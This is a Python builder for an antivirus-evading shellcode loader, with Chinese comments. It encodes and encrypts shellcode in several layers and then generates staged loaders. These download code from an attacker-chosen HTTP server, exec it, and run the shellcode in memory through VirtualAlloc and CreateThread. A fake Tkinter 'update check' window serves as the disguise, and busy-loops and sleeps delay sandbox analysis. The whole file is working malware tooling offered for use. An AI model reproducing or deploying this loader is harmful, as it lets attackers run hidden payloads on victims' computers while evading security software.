import base64
import random
import os

print("Drt-SRC自用免杀")
print("测试环境:Python3.8.0")
print("请在运行结束后运行pyinstaller -F 加载器.txt")
IPserver = input("请输入HTTP服务器ip:")
ShellCode = '请将shellcode放入1.txt'
print("完成请回车")
os.system("pause")



# 读取文件内容
with open('1.txt', 'rb') as file:
    file_content = file.read()

# 对内容进行Base64编码
encoded_content = base64.b64encode(file_content).decode('utf-8')
insertion_points = [random.randint(0, len(encoded_content)) for _ in range(2)]
insertion_points.sort()  # 确保插入位置按升序排列

insert_string = "dashabi"
# 插入字符串
modified_string = encoded_content[:insertion_points[0]] + insert_string + encoded_content[insertion_points[0]:insertion_points[1]] + insert_string + encoded_content[insertion_points[1]:]
# 此时的字符串已经 加入了dashabi
# print(f'Base64 编码后的内容: {modified_string}')

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
from os import urandom
import hashlib

def pad(text):
    # 对文本进行填充
    text = text.encode('utf-8')
    text += b"\0" * (16 - len(text) % 16)
    return text
def encrypt(text, key):
    # 通过 SHA-256 哈希函数将密钥转换为合法长度
    key = hashlib.sha256(key.encode('utf-8')).digest()[:16]

    # 生成16字节的随机初始化向量
    iv = urandom(16)

    # 使用AES算法和CFB模式进行加密
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # 加密文本
    ciphertext = encryptor.update(pad(text)) + encryptor.finalize()

    # 返回加密后的文本和初始化向量
    return b64encode(iv + ciphertext).decode('utf-8')

def decrypt(encrypted_text, key):
    # 通过 SHA-256 哈希函数将密钥转换为合法长度
    key = hashlib.sha256(key.encode('utf-8')).digest()[:16]

    # 解码加密后的文本
    encrypted_data = b64decode(encrypted_text.encode('utf-8'))

    # 提取初始化向量
    iv = encrypted_data[:16]

    # 使用AES算法和CFB模式进行解密
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # 解密文本
    decrypted_text = decryptor.update(encrypted_data[16:]) + decryptor.finalize()

    # 去除填充部分
    decrypted_text = decrypted_text.rstrip(b"\0")

    return decrypted_text.decode('utf-8')

# print(type(modified_string))
aes=str(modified_string)


for it in range(5):
    aes = encrypt(text=aes,key='admin')

import re
encoding_rules = {
    'a': '玛卡巴卡轰',    
    'b': '阿巴雅卡轰',
    'c': '伊卡阿卡噢轰',
    'd': '哈姆达姆阿卡嗙轰',
    'e': '咿呀呦轰',
    'f': '玛卡雅卡轰',
    'g': '伊卡阿卡轰',
    'h': '咿呀巴卡轰',
    'i': '达姆阿卡嗙轰',
    'j': '玛卡巴卡玛卡巴卡轰',
    'k': '玛卡巴卡玛卡巴卡玛卡巴卡轰',
    'l': '玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰',
    'm': '阿巴雅卡阿巴雅卡轰',
    'n': '阿巴雅卡阿巴雅卡阿巴雅卡轰',
    'o': '阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰',
    'p': '伊卡阿卡噢伊卡阿卡噢轰',
    'q': '伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰',
    'r': '伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰',
    's': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    't': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    'u': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    'v': '咿呀呦咿呀呦轰',
    'w': '咿呀呦咿呀呦咿呀呦轰',
    'x': '咿呀呦咿呀呦咿呀呦咿呀呦轰',
    'y': '咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰',
    'z': '玛卡雅卡玛卡雅卡轰',
    'A': '玛卡雅卡玛卡雅卡玛卡雅卡轰',
    'B': '玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰',
    'C': '伊卡阿卡伊卡阿卡轰',
    'D': '伊卡阿卡伊卡阿卡伊卡阿卡轰',
    'E': '伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰',
    'F': '咿呀巴卡咿呀巴卡轰',
    'G': '咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'H': '咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'I': '咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'J': '达姆阿卡嗙达姆阿卡嗙轰',
    'K': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'L': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'M': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'N': '巴卡巴卡轰',
    'O': '巴卡巴卡巴卡巴卡轰',
    'P': '巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'Q': '巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'R': '巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'S': '呀呦轰',
    'T': '呀呦呀呦轰',
    'U': '呀呦呀呦呀呦轰',
    'V': '呀呦呀呦呀呦呀呦轰',
    'W': '呀呦呀呦呀呦呀呦呀呦轰',
    'X': '达姆阿卡轰',
    'Y': '达姆阿卡达姆阿卡轰',
    'Z': '达姆阿卡达姆阿卡达姆阿卡轰',
    '0': '达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰',
    '1': '达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰',
    '2': '玛巴轰',
    '3': '玛巴玛巴轰',
    '4': '玛巴玛巴玛巴轰',
    '5': '玛巴玛巴玛巴玛巴轰',
    '6': '巴卡玛巴轰',
    '7': '巴卡玛巴巴卡玛巴轰',
    '8': '巴卡玛巴巴卡玛巴巴卡玛巴轰',
    '9': '巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰',
    '=': '妈个巴子轰',
    '/': '妈个巴卡轰',
    '+': '妈个巴达轰',

}

def encode(text):
    miwen1=''
    textList = [text[i] for  i in range(len(text))]   # 拆解字符串，将结果放进textList-(list)
    # print(textList)   
    for it in textList:
        # print(it)
        for key,val in encoding_rules.items():
            # print(val)
            if key==it:
                miwen1 = str(miwen1)+str(val)
  
    return miwen1
zuihou = encode(aes)
with open("miwen.txt",'w') as f:
    f.write(zuihou)
    print("miwen.txt生成完毕")
# miwen.txt生成完毕


# 生成无效文件
with open("kygvseedc.txt",'w') as f:
    f.write("")
print("kygvseedc.txt生成完毕")

# 生成fenli.txt

import base64

def encode_to_base64(text):
    # 将文本编码为字节串
    text_bytes = text.encode('utf-8')

    # 使用base64编码
    encoded_bytes = base64.b64encode(text_bytes)

    # 将编码后的字节串转换为字符串
    encoded_text = encoded_bytes.decode('utf-8')

    return encoded_text

# 需要编码的内容，包括中文字符
content = fr'''
import os
import time
import ctypes,urllib.request,codecs,base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
from os import urandom
import hashlib
import re
import sys



encoding_rules = {{
    'a': '玛卡巴卡轰',    
    'b': '阿巴雅卡轰',
    'c': '伊卡阿卡噢轰',
    'd': '哈姆达姆阿卡嗙轰',
    'e': '咿呀呦轰',
    'f': '玛卡雅卡轰',
    'g': '伊卡阿卡轰',
    'h': '咿呀巴卡轰',
    'i': '达姆阿卡嗙轰',
    'j': '玛卡巴卡玛卡巴卡轰',
    'k': '玛卡巴卡玛卡巴卡玛卡巴卡轰',
    'l': '玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰',
    'm': '阿巴雅卡阿巴雅卡轰',
    'n': '阿巴雅卡阿巴雅卡阿巴雅卡轰',
    'o': '阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰',
    'p': '伊卡阿卡噢伊卡阿卡噢轰',
    'q': '伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰',
    'r': '伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰',
    's': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    't': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    'u': '哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰',
    'v': '咿呀呦咿呀呦轰',
    'w': '咿呀呦咿呀呦咿呀呦轰',
    'x': '咿呀呦咿呀呦咿呀呦咿呀呦轰',
    'y': '咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰',
    'z': '玛卡雅卡玛卡雅卡轰',
    'A': '玛卡雅卡玛卡雅卡玛卡雅卡轰',
    'B': '玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰',
    'C': '伊卡阿卡伊卡阿卡轰',
    'D': '伊卡阿卡伊卡阿卡伊卡阿卡轰',
    'E': '伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰',
    'F': '咿呀巴卡咿呀巴卡轰',
    'G': '咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'H': '咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'I': '咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰',
    'J': '达姆阿卡嗙达姆阿卡嗙轰',
    'K': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'L': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'M': '达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰',
    'N': '巴卡巴卡轰',
    'O': '巴卡巴卡巴卡巴卡轰',
    'P': '巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'Q': '巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'R': '巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰',
    'S': '呀呦轰',
    'T': '呀呦呀呦轰',
    'U': '呀呦呀呦呀呦轰',
    'V': '呀呦呀呦呀呦呀呦轰',
    'W': '呀呦呀呦呀呦呀呦呀呦轰',
    'X': '达姆阿卡轰',
    'Y': '达姆阿卡达姆阿卡轰',
    'Z': '达姆阿卡达姆阿卡达姆阿卡轰',
    '0': '达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰',
    '1': '达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰',
    '2': '玛巴轰',
    '3': '玛巴玛巴轰',
    '4': '玛巴玛巴玛巴轰',
    '5': '玛巴玛巴玛巴玛巴轰',
    '6': '巴卡玛巴轰',
    '7': '巴卡玛巴巴卡玛巴轰',
    '8': '巴卡玛巴巴卡玛巴巴卡玛巴轰',
    '9': '巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰',
    '=': '妈个巴子轰',
    '/': '妈个巴卡轰',
    '+': '妈个巴达轰',

}}

def decodemaba(miwen):
    mingwen=''
    # print(f'密文{{miwen}}')
    result = re.split(r'(?<=轰)', miwen)
    # print(result)
    for it in result:
        # print(it)
        for key,val in encoding_rules.items():
            # print(val)
            if it==val:
                # print("找到明文密码")
                # print(key)
                mingwen = str(mingwen)+str(key)
    return mingwen

def run_if_statements():
    for _ in range(1000000000):
        if True:  # 在这里放入你的条件
            pass
def decrypt(encrypted_text, key):
        # 通过 SHA-256 哈希函数将密钥转换为合法长度
        key = hashlib.sha256(key.encode('utf-8')).digest()[:16]

        # 解码加密后的文本
        encrypted_data = b64decode(encrypted_text.encode('utf-8'))

        # 提取初始化向量
        iv = encrypted_data[:16]

        # 使用AES算法和CFB模式进行解密
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        # 解密文本
        decrypted_text = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
        # 去除填充部分
        decrypted_text = decrypted_text.rstrip(b"\0")

        return decrypted_text.decode('utf-8')
def check_file():       # 检查文件是否存在
    file_path = "kygvseedc.txt"     
    if os.path.exists(file_path):
        print("文件存在，开始运行shellcode")
        run_if_statements() #十亿次if
        time.sleep(10)
        key = "admin"

        shellcode = urllib.request.urlopen('http://{IPserver}/miwen.txt').read()





        shellcode = shellcode.strip()
        shellcode = shellcode.decode("gbk")
        print(shellcode)

        shellcode = decodemaba(shellcode)

        for it in range(5):
            shellcode = decrypt(encrypted_text=shellcode,key=key)



        shellcode = shellcode.replace("dashabi",'')
        shellcode = base64.b64decode(shellcode)

        shellcode =codecs.escape_decode(shellcode)[0]

        shellcode = bytearray(shellcode)
        # 设置VirtualAlloc返回类型为ctypes.c_uint64
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        # 申请内存
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
        # 放入shellcode
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_uint64(ptr), 
            buf, 
            ctypes.c_int(len(shellcode))
        )
        # 创建一个线程从shellcode放置位置首地址开始执行
        handle = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0), 
            ctypes.c_int(0), 
            ctypes.c_uint64(ptr), 
            ctypes.c_int(0), 
            ctypes.c_int(0), 
            ctypes.pointer(ctypes.c_int(0))
        )
        # 等待上面创建的线程运行完
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))



        return True
    else:
        return False
            
file_path = check_file()
while not check_file():
    print(f"文件 '{{file_path}}' 不存在，等待10秒后重新检测...")
    time.sleep(10)
else:
    print("未提供有效参数")
# main()




'''

# 调用编码函数
encoded_content = encode_to_base64(content)

# 打印编码后的内容
# print("编码后的内容:")
# print(encoded_content)
with open("fenli.txt",'w') as f:
    f.write(encoded_content)

# 生成loaderSSSSS.py
with open("loaderSSSSS.py",'w') as f:
    f.write(f'''

import os
import requests
import os
import time
import ctypes,urllib.request,codecs,base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
from os import urandom
import hashlib
import re
import sys
i = 0

def SySTemcyfgbgbrsvfnbsdgrjkfenesjlkfg():
    global i
    while i < 100000000:
        ahtdfvghsrybsfnkmarsudfhacsnjldkgfnvklasr()
    


    
def ahtdfvghsrybsfnkmarsudfhacsnjldkgfnvklasr():
    global i
    i = i+1
    # print(i)

    


SySTemcyfgbgbrsvfnbsdgrjkfenesjlkfg()
res = requests.get("http://{IPserver}/fenli.txt")
res.encoding = "utf-8"
strs = res.text
code = base64.b64decode(strs)
exec(code)

''')
print("loaderSSSSS.py生成完毕")

# 
with open("loader.py",'w',encoding='utf-8') as f:
    f.write(f'''
            
import tkinter as tk
import requests
def CheckUpdate():
    res = requests.get("http://{IPserver}/update.txt")
    res.encoding="utf-8"
    if res.text == '存在更新':
        
        print("存在更新")
        import loaderSSSSS
    else:
        print(res.text)
        print("不存在更新")
        tks()
    pass


# 创建一个函数来处理按钮点击事件
def on_button_click():
    print("点你ma呢，这是个木马。")

def tks():
    # 创建主窗口
    root = tk.Tk()
    root.title("Tkinter基础框架")

    # 创建标签
    label = tk.Label(root, text="欢迎使用Tkinter基础框架")
    label.pack(pady=10)

    # 创建按钮
    button = tk.Button(root, text="点击我", command=on_button_click)  # 在创建按钮时，直接指定按钮点击事件
    button.pack()

    # 创建一个文本框
    entry = tk.Entry(root)
    entry.pack()

    # 运行主循环
    root.mainloop()
CheckUpdate()




''')

print("loader.py生成完毕")